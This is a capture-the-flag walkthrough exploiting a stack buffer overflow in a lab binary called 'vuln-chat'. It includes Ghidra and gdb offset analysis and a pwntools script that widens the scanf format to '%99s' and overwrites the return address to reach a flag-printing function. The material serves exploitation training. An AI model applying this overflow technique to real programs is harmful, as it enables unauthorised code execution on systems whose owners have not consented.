### Binary Exploitation

### Source: TU_17

### Basic File Checks

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vulnchat]
└─$ file vuln-chat
vuln-chat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a3caa1805eeeee1454ee76287be398b12b5fa2b7, not stripped
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/vulnchat]
└─$ checksec vuln-chat 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/vulnchat/vuln-chat'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We see we're working with a x86 binary which is dynamically linked and not stripped

Its protection is just `NX` enabled so we won't be able to inject shellcode on the stack and execute it

Lets run it to have an overview of what the binary does

```
└─$ ./vuln-chat        
----------- Welcome to vuln-chat -------------
Enter your username: pwner
Welcome pwner!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
pwner: lol
djinn: Sorry. That's not good enough
```

We see we had to give 2 inputs then the program exits

I'll now decompile the binary using ghidra

Here's the main function 

```
int main(void)

{
  undefined password [20];
  undefined username [20];
  undefined4 fmt;
  undefined local_5;
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  fmt = 0x73303325;
  local_5 = 0;
  __isoc99_scanf(&fmt,username);
  printf("Welcome %s!\n",username);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ",username);
  __isoc99_scanf(&fmt,password);
  puts("djinn: Sorry. That\'s not good enough");
  fflush(stdout);
  return 0;
}
```

So here's whats happening

```
1. We're asked to enter a name and teh input is received using scanf and stored in the format variable
2. After that we're asked to give another input which is still stored in the format variable
3. It then prints out thats not good enough
4. And exits
```

So we also have another function which will print the flag

```

void printFlag(void)

{
  system("/bin/cat ./flag.txt");
  puts("Use it wisely");
  return;
}
```

From this lets analyze what's happening

We know that the format variable holds us 30bytes

```
└─$ echo 0x73303325 | xxd -r | rev
%30s 
```

So lets take a look at the stack layout

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             int __cdecl main(void)
             int               EAX:4          <RETURN>
             undefined1        Stack[-0x5]:1  local_5                                 XREF[1]:     080485c5(W)  
             undefined4        Stack[-0x9]:4  fmt                                     XREF[3]:     080485be(W), 
                                                                                                   080485cd(*), 
                                                                                                   08048630(*)  
             undefined1[20]    Stack[-0x1d]   username                                XREF[3]:     080485c9(*), 
                                                                                                   080485d9(*), 
                                                                                                   0804861b(*)  
             undefined1[20]    Stack[-0x31]   password                                XREF[1]:     0804862c(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:08048487(*), 08048830, 
                                                                                          080488ac(*)  
```

With this we see that 

```
1. The offset of the password buffer  is 0x31 bytes
2. The offset of the username buffer is 0x1d bytes
3. The offset of the fmt variable is 0x9 bytes
```

So that means the offset from the username and password buffer is `( 0x31 - 0x1d = 0x14)` 

And that of the username and fmt is `( 0x1d - 0x9 = 0x14)`

Now at this point what i'll do is to overwrite the fmt to hold up larger bytes, then overwrite the return address to call the flag function

Lets hop on to gdb to get the exact offset from the password buffer to the eip

I'll set a breakpoint immediately after the second scanf

```
└─$ gdb -q vuln-chat
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.11
Reading symbols from vuln-chat...
(No debugging symbols found in vuln-chat)
gef➤  disass main
Dump of assembler code for function main:
   0x0804858a <+0>:     push   ebp
   0x0804858b <+1>:     mov    ebp,esp
   0x0804858d <+3>:     sub    esp,0x30
   0x08048590 <+6>:     mov    eax,ds:0x8049a60
   0x08048595 <+11>:    push   0x14
   0x08048597 <+13>:    push   0x2
   0x08048599 <+15>:    push   0x0
   0x0804859b <+17>:    push   eax
   0x0804859c <+18>:    call   0x8048450 <setvbuf@plt>
   0x080485a1 <+23>:    add    esp,0x10
   0x080485a4 <+26>:    push   0x8048714
   0x080485a9 <+31>:    call   0x8048410 <puts@plt>
   0x080485ae <+36>:    add    esp,0x4
   0x080485b1 <+39>:    push   0x8048743
   0x080485b6 <+44>:    call   0x80483e0 <printf@plt>
   0x080485bb <+49>:    add    esp,0x4
   0x080485be <+52>:    mov    DWORD PTR [ebp-0x5],0x73303325
   0x080485c5 <+59>:    mov    BYTE PTR [ebp-0x1],0x0
   0x080485c9 <+63>:    lea    eax,[ebp-0x19]
   0x080485cc <+66>:    push   eax
   0x080485cd <+67>:    lea    eax,[ebp-0x5]
   0x080485d0 <+70>:    push   eax
   0x080485d1 <+71>:    call   0x8048460 <__isoc99_scanf@plt>
   0x080485d6 <+76>:    add    esp,0x8
   0x080485d9 <+79>:    lea    eax,[ebp-0x19]
   0x080485dc <+82>:    push   eax
   0x080485dd <+83>:    push   0x8048759
   0x080485e2 <+88>:    call   0x80483e0 <printf@plt>
   0x080485e7 <+93>:    add    esp,0x8
   0x080485ea <+96>:    push   0x8048766
   0x080485ef <+101>:   call   0x8048410 <puts@plt>
   0x080485f4 <+106>:   add    esp,0x4
   0x080485f7 <+109>:   push   0x1
   0x080485f9 <+111>:   call   0x8048400 <sleep@plt>
   0x080485fe <+116>:   add    esp,0x4
   0x08048601 <+119>:   push   0x804877c
   0x08048606 <+124>:   call   0x8048410 <puts@plt>
   0x0804860b <+129>:   add    esp,0x4
   0x0804860e <+132>:   push   0x80487a4
   0x08048613 <+137>:   call   0x8048410 <puts@plt>
   0x08048618 <+142>:   add    esp,0x4
   0x0804861b <+145>:   lea    eax,[ebp-0x19]
   0x0804861e <+148>:   push   eax
   0x0804861f <+149>:   push   0x80487e6
   0x08048624 <+154>:   call   0x80483e0 <printf@plt>
   0x08048629 <+159>:   add    esp,0x8
   0x0804862c <+162>:   lea    eax,[ebp-0x2d]
   0x0804862f <+165>:   push   eax
   0x08048630 <+166>:   lea    eax,[ebp-0x5]
   0x08048633 <+169>:   push   eax
   0x08048634 <+170>:   call   0x8048460 <__isoc99_scanf@plt>
   0x08048639 <+175>:   add    esp,0x8
   0x0804863c <+178>:   push   0x80487ec
   0x08048641 <+183>:   call   0x8048410 <puts@plt>
   0x08048646 <+188>:   add    esp,0x4
   0x08048649 <+191>:   mov    eax,ds:0x8049a60
   0x0804864e <+196>:   push   eax
   0x0804864f <+197>:   call   0x80483f0 <fflush@plt>
   0x08048654 <+202>:   add    esp,0x4
   0x08048657 <+205>:   mov    eax,0x0
   0x0804865c <+210>:   leave  
   0x0804865d <+211>:   ret    
End of assembler dump.
gef➤  b *0x08048639
Breakpoint 1 at 0x8048639
gef➤
```

Now i'll run it giving `pwnerhacker` as the username & `1234567890` as password

```
gef➤  r
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/vulnchat/vuln-chat 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
----------- Welcome to vuln-chat -------------
Enter your username: pwnerhacker
Welcome pwnerhacker!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
pwnerhacker: 1234567890

Breakpoint 1, 0x08048639 in main ()


[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1       
$ebx   : 0xf7e1cff4  →  0x0021cd8c
$ecx   : 0x0       
$edx   : 0xf7fc2540  →  0xf7fc2540  →  [loop detected]
$esp   : 0xffffcfb0  →  0xffffcfe3  →  "%30s"
$ebp   : 0xffffcfe8  →  0x00000000
$esi   : 0x8048660  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x8048639  →  <main+175> add esp, 0x8
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfb0│+0x0000: 0xffffcfe3  →  "%30s"        ← $esp
0xffffcfb4│+0x0004: 0xffffcfbb  →  "1234567890"
0xffffcfb8│+0x0008: 0x31c1ca2f
0xffffcfbc│+0x000c: "234567890"
0xffffcfc0│+0x0010: "67890"
0xffffcfc4│+0x0014: 0xf7fc0030 ("0"?)
0xffffcfc8│+0x0018: 0xf7fc1b40  →  0xf7c1f2bc  →  "GLIBC_PRIVATE"
0xffffcfcc│+0x001c: 0x70000001
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048630 <main+166>       lea    eax, [ebp-0x5]
    0x8048633 <main+169>       push   eax
    0x8048634 <main+170>       call   0x8048460 <__isoc99_scanf@plt>
 →  0x8048639 <main+175>       add    esp, 0x8
    0x804863c <main+178>       push   0x80487ec
    0x8048641 <main+183>       call   0x8048410 <puts@plt>
    0x8048646 <main+188>       add    esp, 0x4
    0x8048649 <main+191>       mov    eax, ds:0x8049a60
    0x804864e <main+196>       push   eax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln-chat", stopped 0x8048639 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048639 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Now i'll search for where our input is on the stack 

```
gef➤  search-pattern pwnerhacker
[+] Searching 'pwnerhacker' in memory
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffaf6c - 0xffffaf86  →   "pwnerhacker: hacker!\nme: " 
  0xffffcfcf - 0xffffcfda  →   "pwnerhacker" 
gef➤  search-pattern 1234567890
[+] Searching '1234567890' in memory
[+] In '[heap]'(0x804a000-0x806c000), permission=rw-
  0x804a1a0 - 0x804a1ae  →   "1234567890\n\n" 
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffcfbb - 0xffffcfc5  →   "1234567890" 
gef➤  search-pattern %30s
[+] Searching '%30s' in memory
[+] In '/home/mark/Documents/Pentest/BOF/03-begineer_bof/vulnchat/vuln-chat'(0x8048000-0x8049000), permission=r-x
  0x80485c1 - 0x80485c5  →   "%30s[...]" 
[+] In '/home/mark/Documents/Pentest/BOF/03-begineer_bof/vulnchat/vuln-chat'(0x8049000-0x804a000), permission=rw-
  0x80495c1 - 0x80495c5  →   "%30s[...]" 
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffcfe3 - 0xffffcfe7  →   "%30s" 
gef➤  i f
Stack level 0, frame at 0xffffcff0:
 eip = 0x8048639 in main; saved eip = 0xf7c23295
 Arglist at 0xffffcfe8, args: 
 Locals at 0xffffcfe8, Previous frame's sp is 0xffffcff0
 Saved registers:
  ebp at 0xffffcfe8, eip at 0xffffcfec
gef➤ 
```

Here's basically what the output means

```
1. The address of the username input is 0xffffcfcf
2 .The address of the password input is 0xffffcfbb
3. The address of the fmt variable is 0xffffcfe3
4. The current eip at this state is 0xffffcfec
```

Now lets do the math

```
1. Offset from username to fmt: 0xffffcfe3-0xffffcfcf = 0x14
2. Offset from password to eip: 0xffffcfec-0xffffcfbb = 0x31
```

So lets get the exploit done

Here's my script below

```
from pwn import *

io = process('./vuln-chat')
#gdb.attach(io, gdbscript='b *0x08048639')
print io.recvuntil('username:')

### Payload one --> overwrite the fmt with 99bytes

offset = b"A"*0x14
overwrite = "%99s"
payload1 = offset + overwrite

io.sendline(payload1)

print io.recvuntil('I know I can trust you?')
### Payload two --> overwrite eip to the print flag function

offset = b"B"*0x31
overwrite = p32(0x0804856b)
payload2 = offset + overwrite

io.sendline(payload2)

io.interactive()
```

Cool lets run it now

```
└─$ python2 exploit.py  
[+] Starting local process './vuln-chat': pid 160447
----------- Welcome to vuln-chat -------------
Enter your username:
 Welcome AAAAAAAAAAAAAAAAAAAA%99s!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
[*] Switching to interactive mode

AAAAAAAAAAAAAAAAAAAA%99s: djinn: Sorry. That's not good enough
FLAG{E4SY_4S_PEASY}
Use it wisely
[*] Got EOF while reading in interactive
$ 
[*] Process './vuln-chat' stopped with exit code -11 (SIGSEGV) (pid 160447)
[*] Got EOF while sending in interactive
```

And we're done

<br> <br>
[Back To Home](../../index.md)

